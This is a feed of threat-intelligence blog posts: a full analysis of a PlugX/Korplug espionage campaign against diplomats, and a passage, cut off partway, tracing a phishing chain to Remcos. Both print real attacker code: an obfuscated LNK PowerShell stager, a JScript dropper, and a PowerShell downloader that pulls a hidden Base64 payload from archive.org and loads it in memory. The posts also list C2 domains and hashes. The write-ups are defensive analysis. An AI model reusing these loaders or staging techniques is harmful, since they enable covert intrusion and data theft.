[{"content":" Executive Summary In early October 2025, a targeted cyber espionage campaign leveraged a compromised Royal Embassy of Cambodia email account to deliver a sophisticated SOGU.SEC (also known as PlugX or Korplug) remote access trojan (RAT) to diplomatic entities via a spearphishing email. The email message contained a URL presented as a document about the Cambodia Thailand border crisis, and the landing page impersonated a Microsoft sign‑in portal to prompt a download. A ZIP archive was downloaded, containing a crafted LNK file that launched PowerShell to extract an embedded TAR archive. The TAR unpacked a legitimately signed Canon binary alongside a malicious DLL, which performed staged decryption and execution of the RAT via DLL Sideloading technique. Static and dynamic artifacts, together with behavioral alignment to published reporting, linked this sample to a PRC-nexus threat actor UNC6384, supporting cyber espionage operations aligned with the strategic interests of the People\u0026rsquo;s Republic of China. The use of advanced techniques and layered social engineering demonstrates this threat actor’s advanced capabilities.\nTechnical Analysis The analysis was conducted on Monday, October 1st, 2025, and focused on reconstructing the complete infection chain, from the initial spearphishing email to the final payload execution.\nSpearphishing Email A spearphishing email was sent from a compromised account belonging to the Royal Embassy of Cambodia in Seoul on Tuesday, September 30th, 2025, targeting diplomatic entities.\nThe threat actor used legitimate official emails previously distributed by embassy personnel to other diplomatic entities, specifically those addressing the ongoing Cambodia Thailand border situation [01], as a template. The date in the message body was modified to align with the day the malicious email was sent.\nInstead of the usual attached document containing official correspondence about the border situation, the attacker embedded a URL in the message body. Based on its naming convention, the URL appeared to link to a legitimate document, however, it actually redirected recipients to a Microsoft Azure endpoint under the attacker’s control.\nThe original email message and the spearphishing samples are shown below.\nA comparative analysis of the spearphishing email header and a legitimate message sent from the same address earlier in September 2025 confirmed that both emails originated from the same account. This finding further validated that the attacker had successfully compromised an official government email address for use in the campaign.\nChain of Infection Stage 0 : Delivery When the URL embedded in the spearphishing message was visited, the landing page presented a counterfeit Cloudflare CAPTCHA challenge and visually impersonated Microsoft\u0026rsquo;s sign-in portal by displaying the domain login.microsoftonline.com within the page content.\nAfter the bogus CAPTCHA was completed, the site automatically initiated the download of malicious ZIP archive NV2230_Update of Situation on Cambodia-Thailand Border.zip.\nThe staged challenge and familiar branding were meant to lower suspicion and make the website look legitimate and the download authorized.\nStage 1 : Dropper / Initial Loader The downloaded archive, NV2230_Update of Situation on Cambodia-Thailand Border.zip, contained a single Windows shortcut (LNK) file named NV2230_Update of Situation on Cambodia-Thailand Border.lnk.\n$ unzip NV2230_Update\\ of\\ Situation\\ on\\ Cambodia-Thailand\\ Border.zip Archive: NV2230_Update of Situation on Cambodia-Thailand Border.zip warning: NV2230_Update of Situation on Cambodia-Thailand Border.zip appears to use backslashes as path separators inflating: NV2230_Update of Situation on Cambodia-Thailand Border/NV2230_Update of Situation on Cambodia-Thailand Border.lnk The shortcut file was examined using lnkinfo from the liblnk-utils toolkit [02].\n$ lnkinfo NV2230_Update\\ of\\ Situation\\ on\\ Cambodia-Thailand\\ Border.lnk lnkinfo 20181227 Windows Shortcut information: Contains a description string Contains a command line arguments string Contains an icon location string Contains an environment variables block Link information: Creation time\t: Not set (0) Modification time\t: Not set (0) Access time\t: Not set (0) File size\t: 1174780 bytes Icon index\t: 0 Show Window value\t: 0x0011ecfc Hot Key value\t: 60668 File attribute flags\t: 0x00000000 Description\t: pdf Command line arguments\t: -w 1 -c \u0026#34; ;; ;$ifipuznhxni = (get-childitem -Pa $Env:USERPROFILE -Re -Inc *\u0026#39;NV2230_Update of Situation on Cambodia-Thailand Border\u0026#39;.zip).fullname; ;;$ykvzh=[System.IO.File]::ReadAllBytes($ifipuznhxni);$gujjdckc=854; ;$qiiobmfibdew=[char]87+\u0026#39;r\u0026#39;+[char]105+\u0026#39;te\u0026#39;+[char]65+\u0026#39;l\u0026#39;+[char]108+\u0026#39;b\u0026#39;+[char]121+\u0026#39;tes\u0026#39;; ;echo $gujjdckc; ; ;echo $gujjdckc;;[System.IO.File]::$qiiobmfibdew($Env:temp+\u0026#39;\\\\rphbqultm.ta\u0026#39;, $ykvzh[$gujjdckc..($gujjdckc+2049024-1)]); ;;;echo $gujjdckc;;;;echo $gujjdckc;; TaR -xvf $Env:TEMP\\rphbqultm.ta -C $Env:Temp;;echo $gujjdckc;dir;; Start-Process $Env:temp\\CCGFGAPQ-4KQX-7LS4-LG3P-6DP47ZZ8RV0T\\cnmpaui.exe;\u0026#34; Icon location\t: .\\WindowssSystem326Shell32.pdf Environment variables location\t: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe The lnkinfo output indicated that the shortcut launches PowerShell (C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe) with custom arguments. After cleaning and formatting, the executed PowerShell command was reconstructed as follows.\nC:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -w 1 -c \u0026#34; $ifipuznhxni = ( Get-ChildItem -Pa $Env:USERPROFILE -Re -Inc *\u0026#39;NV2230_Update of Situation on Cambodia-Thailand Border\u0026#39;.zip ).FullName; $ykvzh=[System.IO.File]::ReadAllBytes($ifipuznhxni); $gujjdckc=854; $qiiobmfibdew=[char]87+\u0026#39;r\u0026#39;+[char]105+\u0026#39;te\u0026#39;+[char]65+\u0026#39;l\u0026#39;+[char]108+\u0026#39;b\u0026#39;+[char]121+\u0026#39;tes\u0026#39;; echo $gujjdckc; echo $gujjdckc; [System.IO.File]::$qiiobmfibdew( $Env:temp + \u0026#39;\\rphbqultm.ta\u0026#39;, $ykvzh[$gujjdckc..($gujjdckc + 2049024 - 1)] ); echo $gujjdckc; echo $gujjdckc; TaR -xvf $Env:TEMP\\rphbqultm.ta -C $Env:Temp; echo $gujjdckc; dir; Start-Process $Env:temp\\CCGFGAPQ-4KQX-7LS4-LG3P-6DP47ZZ8RV0T\\cnmpaui.exe;\u0026#34; In this context:\nThe -c argument represents -Command, specifying the command string to execute. The -w 1 argument configures the PowerShell window style to minimized, effectively hiding execution from the user. PowerShell Script Behavior\nSearch and Locate ZIP File The script searches the user\u0026rsquo;s profile directory for any ZIP file whose name contained NV2230_Update of Situation on Cambodia-Thailand Border. This approach ensured the LNK could locate the archive regardless of where the recipient had saved or extracted it. Read ZIP File into Memory It reads the contents of the located ZIP file into memory as a byte array. Extract Embedded Payload The variable $gujjdckc defines an offset value of 854 bytes, indicating where to begin extracting a hidden data segment within the ZIP file. A new string variable is then constructed dynamically using character codes, producing the method name WriteAllBytes. This obfuscation is intended to make static analysis more difficult. [char]87 + \u0026#39;r\u0026#39; → \u0026#34;Wr\u0026#34; + [char]105 → \u0026#34;Wri\u0026#34; + \u0026#39;te\u0026#39; → \u0026#34;Write\u0026#34; + [char]65 → \u0026#34;WriteA\u0026#34; + \u0026#39;l\u0026#39; → \u0026#34;WriteAl\u0026#34; + [char]108 → \u0026#34;WriteAll\u0026#34; + \u0026#39;b\u0026#39; → \u0026#34;WriteAllb\u0026#34; + [char]121 → \u0026#34;WriteAllby\u0026#34; + \u0026#39;tes\u0026#39; → \u0026#34;WriteAllbytes\u0026#34; Write and Extract Payload The script writes a 2049024 byte section from the ZIP file, beginning at byte offset 854, into a temporary file named %TEMP%\\rphbqultm.ta. It then extracts this archive using the tar utility into the %TEMP% directory. Execution of Dropped Binary Finally, the script executes the file cnmpaui.exe from a directory named CCGFGAPQ-4KQX-7LS4-LG3P-6DP47ZZ8RV0T within %TEMP%. Throughout the PowerShell command, multiple echo and dir commands are present. These commands appeared to serve a debugging purpose and do not alter the execution flow.\nStage 2 : Loader / Secondary Payload / RAT Deployment A short Python script was used to reproduce the extraction behavior observed in the PowerShell command embedded in the LNK file. The script reads the file NV2230_Update of Situation on Cambodia-Thailand Border.zip, extracts the byte range starting at offset 854 for 2049024 bytes and writes the result to rphbqultm.ta.\n#!/usr/bin/env python3 input_file = \u0026#34;NV2230_Update of Situation on Cambodia-Thailand Border.zip\u0026#34; offset = 854 length = 2049024 output_file = \u0026#34;rphbqultm.ta\u0026#34; with open(input_file, \u0026#34;rb\u0026#34;) as f_in: f_in.seek(offset) data = f_in.read(length) with open(output_file, \u0026#34;wb\u0026#34;) as f_out: f_out.write(data) The script successfully wrote the expected number of bytes and produced a file that was identified as a tar archive. The archive was then extracted to reveal a directory containing three files.\n$ python3 archive_extractor.py Wrote 2049024 bytes to \u0026#39;rphbqultm.ta\u0026#39;. $ file rphbqultm.ta rphbqultm.ta: POSIX tar archive $ tar -xvf rphbqultm.ta CCGFGAPQ-4KQX-7LS4-LG3P-6DP47ZZ8RV0T/ CCGFGAPQ-4KQX-7LS4-LG3P-6DP47ZZ8RV0T/cnmpaui.dll CCGFGAPQ-4KQX-7LS4-LG3P-6DP47ZZ8RV0T/cnmpaui.exe CCGFGAPQ-4KQX-7LS4-LG3P-6DP47ZZ8RV0T/cnmplog.dat File type identification reported the following.\n$ file CCGFGAPQ-4KQX-7LS4-LG3P-6DP47ZZ8RV0T/* CCGFGAPQ-4KQX-7LS4-LG3P-6DP47ZZ8RV0T/cnmpaui.dll: PE32 executable (DLL) (GUI) Intel 80386, for MS Windows, 4 sections CCGFGAPQ-4KQX-7LS4-LG3P-6DP47ZZ8RV0T/cnmpaui.exe: PE32 executable (GUI) Intel 80386, for MS Windows, 6 sections CCGFGAPQ-4KQX-7LS4-LG3P-6DP47ZZ8RV0T/cnmplog.dat: data Signature verification was performed using osslsigncode [03]. Result indicated that cnmpaui.exe is authentically signed by Canon, however, the signing certificate had expired in 2018.\n$ osslsigncode verify CCGFGAPQ-4KQX-7LS4-LG3P-6DP47ZZ8RV0T/cnmpaui.exe PE checksum : 000608B0 Signature Index: 0 (Primary Signature) Message digest algorithm : SHA1 Current message digest : 76E99ABD3FEF78E76BE262AFB943713261F3D650 Calculated message digest : 76E99ABD3FEF78E76BE262AFB943713261F3D650 Signer\u0026#39;s certificate: ------------------ Signer #0: Subject: /C=JP/ST=Kanagawa/L=Kawasaki-shi/O=Canon Inc./OU=Inkjet System Development Center/CN=Canon Inc. Issuer : /C=US/O=VeriSign, Inc./OU=VeriSign Trust Network/OU=Terms of use at https:\\/\\/www.verisign.com\\/rpa (c)10/CN=VeriSign Class 3 Code Signing 2010 CA Serial : 20A947947E703391C3008B626606FA8F Certificate expiration date: notBefore : Mar 30 00:00:00 2015 GMT notAfter : Apr 18 23:59:59 2018 GMT . . . Signature Index: 1 Message digest algorithm : SHA256 Current message digest : D9E0CAD06D399BF9BFB39BF15631320A1BCEA4D7E32DE152252BD25B3A21E6A4 Calculated message digest : D9E0CAD06D399BF9BFB39BF15631320A1BCEA4D7E32DE152252BD25B3A21E6A4 Signer\u0026#39;s certificate: ------------------ Signer #0: Subject: /C=JP/ST=Kanagawa/L=Kawasaki-shi/O=Canon Inc./OU=Inkjet System Development Center/CN=Canon Inc. Issuer : /C=US/O=Symantec Corporation/OU=Symantec Trust Network/CN=Symantec Class 3 SHA256 Code Signing CA Serial : 6B648EAF4604EE3CF3AA244B0286F161 Certificate expiration date: notBefore : Sep 7 00:00:00 2015 GMT notAfter : Apr 18 23:59:59 2018 GMT . . . Next, the file cnmpaui.dll was analyzed using Detect It Easy (DiE) [04]. The tool produced the following output.\nAt approximately 4 KB, the DLL was notably small, indicating it most likely functioned as a loader / decryptor.\nAs found out from the Powershell script that was embeded in the LNK file, Canon\u0026rsquo;s IJ Printer Assistant Tool (cnmpaui.exe) is launched, which uses DLL Sideloading technique to load the cnmpaui.dll, that decrypts cnmpaui.dat.\nDuring the execution flow, the victim was presented with a document titled 2025.09.30_NV2230_Update of Situation on Cambodia-Thailand Border(For 28-29 Sept 2025).pdf to make the download seem legitimate, distracting the victim while the malicious code was executed in the background.\nDetonating the analyzed sample in the sandbox allowed us to determine the C2 domain used:\ndorareco.net Complete analysis based on sandbox execution can be found on Recorded Future Triage [05].\nAttribution Leveraging the collected technical evidence together with OSINT, the analyzed sample was confidently identified as a variant associated with the SOGU.SEC (also known as PlugX or Korplug) malware documented in Google Cloud’s Threat Intelligence (Mandiant) report titled Deception in Depth: PRC-Nexus Espionage Campaign Hijacks Web Traffic to Target Diplomats, published August 25, 2025 [06]. According to the report, the UNC6384 threat actor, a cluster associated with Chinese state linked cyber espionage, conducted targeted operations against diplomatic and governmental organizations. The group employed DLL Sideloading technique, encrypted configuration data, and modular payloads to maintain persistence.\nThe observed delivery method, execution pattern (PowerShell, tar extraction, signed Canon executable, DLL Sideloading) and other technical evidence, strongly matched the UNC6384 activity cluster documented by mentioned Google Cloud’s Threat Intelligence (Mandiant) report. This alignment strengthened the operational attribution to UNC6384 and provided context for the targeting of diplomatic entities described in the public report.\nAdditional samples demonstrating similar behavior have been identified and analyzed in other independent research efforts, including:\nCyber Threat Intelligence Briefing: Mustang Panda Spear-Phishing Campaign Exploiting the Cambodia-Thailand Border Situation by Pisut Muangsamai [07] CN APT targets Serbian Government by StrikeReady Labs [08] For a more detailed technical analysis of the Korplug malware, readers may refer to the two part analysis by RevEng.AI:\nUnmasking KorPlug: A Technical Breakdown - Part 1 [09] Unmasking KorPlug: A Technical Breakdown - Part 2 [10] Indicators of Compromise (IoCs) URL (Malware Distribution)\nCategory Value Azure storage https://mydownload.z29.web.core.windows.net/NV2230_Update_of_Situation_on_Cambodia-Thailand_Border.zip Command and Control (C2)\nCategory Value C2 (domain) dorareco.net Malware Files / Artifacts\nFilename / Artifact MD5 SHA-1 SHA-256 NV2230_Update of Situation on Cambodia-Thailand Border.zip c33861eb02323660ecef2f261f92880d 83c3cda4bc929a84ccc16a25595a1e85ee433faf b15acbf8509ee90858a1d60eea3c50094b1e2b0b65c8596c65fc998e9b6a08a9 NV2230_Update of Situation on Cambodia-Thailand Border.lnk bb74ca3517e51030867ced3a8ceb149d 7c465b66ff8ef4132e74ab489f6731bd26a4b64d 8635dcc2001514febc6a07714b8cf6a3684b4c4c3b8fc0e08b2f6b92a045e3cc rphbqultm.ta 80639fb809c24ab2f12ea7c4da167862 572fc5774568e536f956a002e67ade23af19b034 f04340f93e2f5f7d6d5521572f17c5b80f39984ee6b4b8c0899380e95a825127 cnmpaui.dll a38de163ee19e78d8582efb9d7f286c1 1ca908b27701259472c16614c3a69f48752bf6cf e35d8815206a77028b7b43bfb047eb9ad8a151164f5c1a7b6d3294bd50b668f2 cnmpaui.exe 0538e73fc195c3b4441721d4c60d0b96 baa569318144905563b469a5a006ad54eb616a02 4ed76fa68ef9e1a7705a849d47b3d9dcdf969e332bd5bcb68138579c288a16d3 cnmplog.dat f4b1a1516c99a196cd4d6af18f611766 46a530dd71b20a2b3f30b411dbe86f48e3d07750 d70600f0e4367e6e3e07f7b965b654e5bfbcb0afbccfe0f6a9a8d9f69c7061a3 Appendices Appendix A : C2 Domain Name WHOIS Record Domain name: dorareco.net Registry Domain ID: 3023929170_DOMAIN_NET-VRSN Registrar WHOIS Server: whois.namecheap.com Registrar URL: http://www.namecheap.com Updated Date: 0001-01-01T00:00:00.00Z Creation Date: 2025-09-28T08:20:33.00Z Registrar Registration Expiration Date: 2026-09-28T08:20:33.00Z Registrar: NAMECHEAP INC Registrar IANA ID: 1068 Registrar Abuse Contact Email: abuse@namecheap.com Registrar Abuse Contact Phone: +1.9854014545 Reseller: NAMECHEAP INC Domain Status: clientTransferProhibited https://icann.org/epp#clientTransferProhibited Registry Registrant ID: Registrant Name: Redacted for Privacy Registrant Organization: Privacy service provided by Withheld for Privacy ehf Registrant Street: Kalkofnsvegur 2 Registrant City: Reykjavik Registrant State/Province: Capital Region Registrant Postal Code: 101 Registrant Country: IS Registrant Phone: +354.4212434 Registrant Phone Ext: Registrant Fax: Registrant Fax Ext: Registrant Email: ceb7a36e45864be88d86367fbec8e38e.protect@withheldforprivacy.com Registry Admin ID: Admin Name: Redacted for Privacy Admin Organization: Privacy service provided by Withheld for Privacy ehf Admin Street: Kalkofnsvegur 2 Admin City: Reykjavik Admin State/Province: Capital Region Admin Postal Code: 101 Admin Country: IS Admin Phone: +354.4212434 Admin Phone Ext: Admin Fax: Admin Fax Ext: Admin Email: ceb7a36e45864be88d86367fbec8e38e.protect@withheldforprivacy.com Registry Tech ID: Tech Name: Redacted for Privacy Tech Organization: Privacy service provided by Withheld for Privacy ehf Tech Street: Kalkofnsvegur 2 Tech City: Reykjavik Tech State/Province: Capital Region Tech Postal Code: 101 Tech Country: IS Tech Phone: +354.4212434 Tech Phone Ext: Tech Fax: Tech Fax Ext: Tech Email: ceb7a36e45864be88d86367fbec8e38e.protect@withheldforprivacy.com Name Server: dns1.registrar-servers.com Name Server: dns2.registrar-servers.com References [01] 2025 Cambodia Thailand border crisis: https://en.wikipedia.org/wiki/2025_Cambodian%E2%80%93Thai_border_crisis [02] liblnk-utils : https://launchpad.net/ubuntu/noble/+package/liblnk-utils [03] osslsigncode : https://github.com/mtrojnar/osslsigncode [04] Detect It Easy (DiE) : https://github.com/horsicq/Detect-It-Easy [05] Recorded Future Triage (Sample Analysis) : https://tria.ge/251021-g4nhbsgr4v [06] Deception in Depth: PRC-Nexus Espionage Campaign Hijacks Web Traffic to Target Diplomats : https://cloud.google.com/blog/topics/threat-intelligence/prc-nexus-espionage-targets-diplomats [07] Cyber Threat Intelligence Briefing: Mustang Panda Spear-Phishing Campaign Exploiting the Cambodia-Thailand Border Situation : https://www.linkedin.com/pulse/cyber-threat-intelligence-briefing-mustang-panda-pisut-muangsamai-7mtfc/ [08] CN APT targets Serbian Government : https://strikeready.com/blog/cn-apt-targets-serbian-government/ [09] Unmasking KorPlug: A Technical Breakdown - Part 1 : https://blog.reveng.ai/unmasking-korplug-journey-into-a-chinese-cyberattack-part-1-2/ [10] Unmasking KorPlug: A Technical Breakdown - Part 2 : https://blog.reveng.ai/unmasking-korplug-a-technical-breakdown-part-2/ ","permalink":"https://martinkubecka.sk/posts/2025-10-29-chinese_unc6384_malware_campaign_exploits_cambodia_thailand_crisis/","summary":"Executive Summary In early October 2025, a targeted cyber espionage campaign leveraged a compromised Royal Embassy of Cambodia email account to deliver a sophisticated SOGU.SEC (also known as PlugX or Korplug) remote access trojan (RAT) to diplomatic entities via a spearphishing email. The email message contained a URL presented as a document about the Cambodia Thailand border crisis, and the landing page impersonated a Microsoft sign‑in portal to prompt a download.","title":"Chinese UNC6384 Malware Campaign Exploits Cambodia Thailand Crisis"},{"content":" Executive Summary A phishing campaign was observed delivering a staged malware chain that could potentially have led to remote access compromise. An attacker sent a phishing message from perfecttradedr@gmail.com linking to https://www.cekomng.shop/. A user who visited the site received and executed an obfuscated JavaScript dropper (Adobe873768.js). The JavaScript launched an obfuscated PowerShell downloader which retrieved an image from archive.org that contained an embedded Base64 payload. That payload was decoded and loaded in-memory as a .NET assembly. The loader invoked a method (VAI) that behaved as a flexible dropper and persistence orchestrator. The in-memory DLL matched characteristics of a Katz Stealer variant and subsequently fetched a second stage payload that unpacked into a Remcos Remote Access Trojan. The RAT ran masquerading as calc.exe, established outbound connections to cnn9001.duckdns.org, and enabled remote control and post exploitation activity.\nTechnical Analysis The analysis was conducted on Monday, September 29th, 2025, and focused on reconstructing the complete infection chain, from the initial unsophisticated phishing email to the final remote access payload execution. The following sections describe each stage of this process in detail, supported by recovered and decoded scripts, binaries, and other forensic artifacts.\nPhishing Email The malicious email under investigation was sent from Perfect Trade ALEX \u0026lt;perfecttradedr@gmail.com\u0026gt;. Using a freely available language translation tool, the content was identified as Bosnian, Croatian or Serbian. The email text translates approximately to:\nSubject: \u0026ldquo;INVOICE and EUR 1\u0026rdquo; Body: \u0026ldquo;Dear, Enclosed, without EUR1.\u0026rdquo; The email message is shown below:\nA closer look at the email header confirmed that the message originated directly from Gmail infrastructure. This means that the sender did not rely on spoofing a third party mail relay, but instead sent the email via a Gmail account. Consequently, standard authentication mechanisms (SPF and DKIM) successfully passed.\nBelow is a parsed and anonymized part of the email header:\nReceived-SPF: Pass (REDACTED: domain of perfecttradedr@gmail.com designates 2a00:1450:4864:20::62d as permitted sender) identity=mailfrom; client-ip=2a00:1450:4864:20::62d; receiver=REDACTED; envelope-from=\u0026#34;perfecttradedr@gmail.com\u0026#34;; x-sender=\u0026#34;perfecttradedr@gmail.com\u0026#34;; x-conformance=spf_only; x-record-type=\u0026#34;v=spf1\u0026#34;; x-record-text=\u0026#34;v=spf1 ip6:2001:4860:4000::/36 ip6:2404:6800:4000::/36 ip6:2607:f8b0:4000::/36 ip6:2800:3f0:4000::/36 ip6:2a00:1450:4000::/36 ip6:2c0f:fb50:4000::/36 ~all\u0026#34; . . . Authentication-Results: REDACTED; spf=Pass smtp.mailfrom=perfecttradedr@gmail.com; dkim=pass (signature verified) header.i=@gmail.com . . . Received: from mail-ej1-x62d.google.com ([IPv6:2a00:1450:4864:20::62d]) by REDACTED with ESMTP/TLS/TLS_AES_256_GCM_SHA384; 29 Sep 2025 10:51:15 +0200 Received: by mail-ej1-x62d.google.com with SMTP id a640c23a62f3a-b3c2db014easo255316166b.0 for \u0026lt;REDACTED\u0026gt;; Mon, 29 Sep 2025 01:51:15 -0700 (PDT) . . . X-Received: by 2002:a17:907:3d9e:b0:b2b:a56f:5434 with SMTP id a640c23a62f3a-b34b644a7ccmr1738215266b.13.1759135871617; Mon, 29 Sep 2025 01:51:11 -0700 (PDT) MIME-Version: 1.0 From: Perfect Trade ALEX \u0026lt;perfecttradedr@gmail.com\u0026gt; Date: Mon, 29 Sep 2025 09:50:58 +0100 Message-ID: \u0026lt;CAL=BSPbHW+E4OrHkZHUeZuEnAJBS7V0oUKuRtZ=KYXN3OdxgvA@mail.gmail.com\u0026gt; Subject: =?UTF-8?Q?RA=C4=8CUN_i_EUR_1?= To: Perfect Trade ALEX \u0026lt;perfecttradedr@gmail.com\u0026gt; . . . The analyzed email sample was relayed through Gmail\u0026rsquo;s legitimate infrastructure, which allowed it to pass standard authentication checks, thereby reducing suspicion from automated filters. A closer look at the message body reveals a signature block attributed to Miroslav Svitlica of AG Infoplan d.o.o. Nikšić, which did not align with the displayed sender identity Perfect Trade ALEX. This mismatch between the visible sender address and the individual referenced in the body is a common indicator of fraudulent intent and suggests the email was crafted to impersonate a legitimate business contact.\nOverall, the analyzed email sample is very unsophisticated. It lacked personalization, contextual tailoring, or any effort to convincingly mimic a real business correspondence. This strongly suggests that the campaign was not a targeted spearphishing attempt, but rather the work of an opportunistic attacker.\nChain of Infection Stage 0 : Initial delivery and drive-by (staged) download The image embedded under the email body, was designed to mimic an attachment in the Gmail client, but in reality it pointed to https://www.cekomng.shop/. Clicking the image, or visiting that URL directly, caused a JavaScript file to be downloaded automatically with the filename Adobe873768.js.\n$ file Adobe873768.js Adobe873768.js: JavaScript source, Unicode text, UTF-8 text, with very long lines (15744), with CRLF line terminators Stage 1 : JavaScript Dropper Below is an abbreviated contents of the obfuscated JavaScript (comments are in the original Spanish / Portuguese language). The script is intended to run under Windows Script Host (WScript). It constructs COM objects (ActiveX) [1] and uses WMI (winmgmts) [2] to spawn a hidden process, avoiding any visible console or window on execution.\n(function () { function unsquareable() { this.Antirio = new ActiveXObject(\u0026#34;Scripting.FileSystemObject\u0026#34;); // pega a pasta do script this.playboys = this.Antirio.GetParentFolderName(WScript.ScriptFullName); this.pimaric = \u0026#34;J⤱޷⷟🦝ᖈࣾՌūᦴݶƺ⏩₃ߛᨱG⤱޷⷟🦝ᖈࣾՌūᦴݶƺ⏩₃ߛᨱN . . .\u0026#34;.split(\u0026#34;⤱޷⷟🦝ᖈࣾՌūᦴݶƺ⏩₃ߛᨱ\u0026#34;).join(\u0026#34;\u0026#34;); } unsquareable.prototype._buildCommand = function () { var chiromancer = [ \u0026#34;d఻Ⲕ␛т🔻ತϙῧ॔ὅڮ ⹆ყpd఻Ⲕ␛т🔻ತϙῧ॔ὅڮ ⹆ყod఻Ⲕ␛т . . . (\u0026#39;\u0026#34; + this.pimaric + \u0026#34;\u0026#39;d఻Ⲕ␛т🔻ತϙῧ॔ὅڮ ⹆ყ)) \u0026#34;, \u0026#34;d఻Ⲕ␛т🔻ತϙῧ॔ὅڮ ⹆ყ| . . .\u0026#34; ]; return chiromancer.join(\u0026#34;\u0026#34;).replace(/d఻Ⲕ␛т🔻ತϙῧ॔ὅڮ ⹆ყ/g, \u0026#34;\u0026#34;); }; unsquareable.prototype.run = function () { var schedule = this._buildCommand(); var paraelectric = GetObject(\u0026#34;winmgmts:root\\\\cimv2\u0026#34;); var dendrochemical = paraelectric.Get(\u0026#34;Win32_Process\u0026#34;); var morosoph = paraelectric.Get(\u0026#34;Win32_ProcessStartup\u0026#34;).SpawnInstance_(); morosoph.ShowWindow = 0; // 0 = oculto // aqui uso a pasta do script, em vez de null var cholelithic = dendrochemical.Create(schedule, this.playboys, morosoph, 0); if (cholelithic === 0) { // sucesso } else { // erro } }; (new unsquareable()).run(); })(); The script stores a long, obfuscated string in this.pimaric property. That string contains the actual payload data with a recurring, unusual Unicode sequence used as a separator. The script reconstructs a Base64 string by removing those separator tokens. An array (chiromancer) contains numerous command fragments also broken by a different repeating Unicode separator. The code joins these fragments with this.pimaric property and strips the separator to produce a final command string named schedule. When reconstructed, the schedule variable is a PowerShell one-liner which decodes an embedded Base64 string, and then using Invoke-Expression [3] on the decoded string.\npowershell -NoProfile -WindowStyle Hidden -Command \u0026#34;[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(\u0026#39;JGNsaWVudE9iaiA9IE5ldy1PYmplY3QgTmV0LldlYkNsaWVudDsgJGNsaWVudE9iai5FbmNvZGluZyA9IFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjg7ICRudWxsID0gKCRjbGllbnRPYmouRG93bmxvYWRTdHJpbmcoJ2h0dHA6Ly9hcmNoaXZlLm9yZy9kb3dubG9hZC9vcHRpbWl6ZWRfbXNpX3Byb193aXRoX2I2NF8yMDI1MDkvb3B0aW1pemVkX01TSV9QUk9fd2l0aF9iNjQucG5nJykgLW1hdGNoICdCYXNlU3RhcnQtKC4qPyktQmFzZUVuZCcpOyRkYXRhQmxvY2sgPSAkbWF0Y2hlc1sxXTskbG9hZGVkQXNtID0gW1JlZmxlY3Rpb24uQXNzZW1ibHldOjpMb2FkKFtDb252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZygkZGF0YUJsb2NrKSk7JGlucHV0QXJnID0gJz09Z2FNNW1ieDVXUUk5U1pzbG1admtHY2g5U2J2Tm1MdWxXWXlSR2JsaFhhdzl5TDZNSGMwUkhhJzskY2xhc3NSZWYgPSAkbG9hZGVkQXNtLkdldFR5cGUoJ0NsYXNzTGlicmFyeTEuSG9tZScpOyRtZXRob2RSZWYgPSAkY2xhc3NSZWYuR2V0TWV0aG9kKCdWQUknKTskbWV0aG9kUmVmLkludm9rZSgkbnVsbCwgW29iamVjdFtdXUAoJGlucHV0QXJnLCcnLCdDOlxVc2Vyc1xQdWJsaWNcRG93bmxvYWRzXCcsJ05hbWVfRmlsZScsJ2NhbGMnLCcxJywnY2FsYycsJycsJ1VSTCcsJ0M6XFVzZXJzXFB1YmxpY1xEb3dubG9hZHNcJywnTmFtZV9GaWxlJywnanMnLCcxJywnJywnVGFza19OYW1lJywnMCcsJ3N0YXJ0dXBfb25zdGFydCcpKTs=\u0026#39;)) | Invoke-Expression\u0026#34; Stage 2 : PowerShell Downloader / Loader Decoding the Base64 string (the payload originally stored in this.pimaric) reveals a PowerShell that creates a Net.WebClient, downloads a file from the Internet Archive (referenced as optimized_MSI_PRO_with_b64.png), extracts a Base64 block delimited by BaseStart- and -BaseEnd using a regex, decodes that block to bytes, and then loads those bytes as a .NET assembly in memory via [Reflection.Assembly]::Load([Convert]::FromBase64String(...)) [4]. The script then uses reflection to get type ClassLibrary1.Home, method VAI, and invokes it as a method (target is $null) with a 17 element object[] parameter array.\n$clientObj = New-Object Net.WebClient; $clientObj.Encoding = [System.Text.Encoding]::UTF8; $null = ($clientObj.DownloadString(\u0026#39;http://archive.org/download/optimized_msi_pro_with_b64_202509/optimized_MSI_PRO_with_b64.png\u0026#39;) -match \u0026#39;BaseStart-(.*?)-BaseEnd\u0026#39;); $dataBlock = $matches[1]; $loadedAsm = [Reflection.Assembly]::Load([Convert]::FromBase64String($dataBlock)); $inputArg = \u0026#39;==gaM5mbx5WQI9SZslmZvkGch9SbvNmLulWYyRGblhXaw9yL6MHc0RHa\u0026#39;; $classRef = $loadedAsm.GetType(\u0026#39;ClassLibrary1.Home\u0026#39;); $methodRef = $classRef.GetMethod(\u0026#39;VAI\u0026#39;); $methodRef.Invoke($null,[object[]]@($inputArg,\u0026#39;\u0026#39;,\u0026#39;C:\\Users\\Public\\Downloads\\\u0026#39;,\u0026#39;Name_File\u0026#39;,\u0026#39;calc\u0026#39;,\u0026#39;1\u0026#39;,\u0026#39;calc\u0026#39;,\u0026#39;\u0026#39;,\u0026#39;URL\u0026#39;,\u0026#39;C:\\Users\\Public\\Downloads\\\u0026#39;,\u0026#39;Name_File\u0026#39;,\u0026#39;js\u0026#39;,\u0026#39;1\u0026#39;,\u0026#39;\u0026#39;,\u0026#39;Task_Name\u0026#39;,\u0026#39;0\u0026#39;,\u0026#39;startup_onstart\u0026#39;)); While examining the referenced image file, mismatch between the file extension and the actual header signature was found, where the file served as optimized_MSI_PRO_with_b64.png contains a JPEG header.\n$ head -n 1 optimized_MSI_PRO_with_b64.jpeg ����JFIF��C\tThe image optimized_MSI_PRO_with_b64.png renders normally, even though it contains the malicious Base64 encoded data.\nInspecting the tail of the image file optimized_MSI_PRO_with_b64.png shows that a BaseStart-...-BaseEnd payload is indeed appended after the image bytes.\n$ tail -n 1 optimized_MSI_PRO_with_b64.png 